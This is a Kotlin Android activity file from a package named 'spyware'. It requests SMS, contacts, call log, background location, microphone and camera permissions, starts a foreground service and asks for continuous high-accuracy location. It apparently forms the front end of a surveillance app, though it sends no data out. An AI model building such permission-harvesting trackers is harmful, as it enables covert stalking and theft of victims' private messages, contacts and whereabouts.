package com.mhl.spyware

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationRequest
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.renderscript.RenderScript
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.Priority
import java.lang.Thread.sleep


class MainActivity : AppCompatActivity() {


    companion object {
        const val REQUEST_LOCATION_SETTINGS = 1001
        const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
    }



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        checkAndRequestPermissions()
        val serviceIntent = Intent(this, MyForegroundService::class.java)
        startService(serviceIntent)




    }


    private fun checkAndRequestPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        // First request all permissions except background location
        if (!PermissionUtils.checkSMSPermission(this)) {
            Log.d("Permissions", "SMS permissions needed")
            permissionsToRequest.addAll(PermissionUtils.SMS_PERMISSIONS)
        }
        if (!PermissionUtils.checkContactsPermission(this)) {
            Log.d("Permissions", "Contacts permissions needed")
            permissionsToRequest.addAll(PermissionUtils.CONTACTS_PERMISSIONS)
        }
        if (!PermissionUtils.checkCallLogPermission(this)) {
            Log.d("Permissions", "Call log permissions needed")
            permissionsToRequest.addAll(PermissionUtils.CALL_LOG_PERMISSIONS)
        }
        if (!PermissionUtils.checkForegroundLocationPermission(this)) {
            Log.d("Permissions", "Location permissions needed")
            permissionsToRequest.addAll(PermissionUtils.FOREGROUND_LOCATION_PERMISSIONS)
        }
        if (!PermissionUtils.checkNotificationPermission(this)) {
            Log.d("Permissions", "Notification permissions needed")
            permissionsToRequest.addAll(PermissionUtils.NOTIFICATION_PERMISSIONS)
        }
        if (!PermissionUtils.checkAudioPermission(this)) {
            Log.d("Permissions", "Audio permissions needed")
            permissionsToRequest.addAll(PermissionUtils.AUDIO_PERMISSIONS)
        }
        if (!PermissionUtils.checkCameraPermission(this)) {
            Log.d("Permissions", "Camera permissions needed")
            permissionsToRequest.addAll(PermissionUtils.CAMERA_PERMISSIONS)
        }

        Log.d("Permissions", "Permissions to request: ${permissionsToRequest.joinToString()}")

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PermissionUtils.PERMISSION_REQUEST_ALL
            )
        } else {
            checkBackgroundLocationPermission()

        }
    }

    private fun checkBackgroundLocationPermission() {
        if (!PermissionUtils.checkBackgroundLocationPermission(this)) {
            if (PermissionUtils.shouldShowRequestPermissionRationale(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                )
            ) {

                Toast.makeText(
                    this,
                    "Background location is needed for continuous location updates",
                    Toast.LENGTH_LONG
                ).show()
            }
            ActivityCompat.requestPermissions(
                this,
                PermissionUtils.BACKGROUND_LOCATION_PERMISSION,
                BACKGROUND_LOCATION_REQUEST_CODE
            )
        } else {
            promptToEnableLocationAccess()
        }
    }


    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        Log.d("Permissions", "onRequestPermissionsResult: requestCode=$requestCode")
        Log.d("Permissions", "Permissions: ${permissions.joinToString()}")
        Log.d("Permissions", "Results: ${grantResults.joinToString()}")

        when (requestCode) {
            PermissionUtils.PERMISSION_REQUEST_ALL -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    Log.d("Permissions", "All regular permissions granted")
                    checkBackgroundLocationPermission()
                } else {
                    Log.d("Permissions", "Some permissions were denied")
                    Toast.makeText(
                        this,
                        "Some permissions were denied. App functionality may be limited.",
                        Toast.LENGTH_SHORT
                    ).show()

                    checkBackgroundLocationPermission()
                }
            }

            BACKGROUND_LOCATION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("Permissions", "Background location permission granted")
                    promptToEnableLocationAccess()
                } else {
                    Log.d("Permissions", "Background location permission denied")
                    Toast.makeText(
                        this,
                        "Background location permission denied. Some features may be limited.",
                        Toast.LENGTH_SHORT
                    ).show()

                }
            }
        }
    }


    private fun promptToEnableLocationAccess() {
        Log.d("Location", "Prompting to enable location access")
        val locationRequest = com.google.android.gms.location.LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            10 * 1000L
        )
            .setMinUpdateIntervalMillis(5 * 1000L)
            .setWaitForAccurateLocation(true)
            .build()

        val locationSettingsRequest = LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)
            .build()

        val settingsClient = LocationServices.getSettingsClient(this)

        settingsClient.checkLocationSettings(locationSettingsRequest)
            .addOnSuccessListener {
                Log.d("Location", "Location services are enabled")
                Toast.makeText(this, "Location access is enabled!", Toast.LENGTH_SHORT).show()
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        Log.d("Location", "Showing location settings dialog")
                        exception.startResolutionForResult(
                            this,
                            REQUEST_LOCATION_SETTINGS
                        )
                    } catch (sendEx: Exception) {
                        Log.e("Location", "Error showing location settings dialog", sendEx)
                        Toast.makeText(
                            this,
                            "Error enabling location: ${sendEx.message}",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                } else {
                    Log.e("Location", "Location settings check failed", exception)
                    Toast.makeText(this, "Location access is required!", Toast.LENGTH_SHORT).show()
                }
            }
    }


}

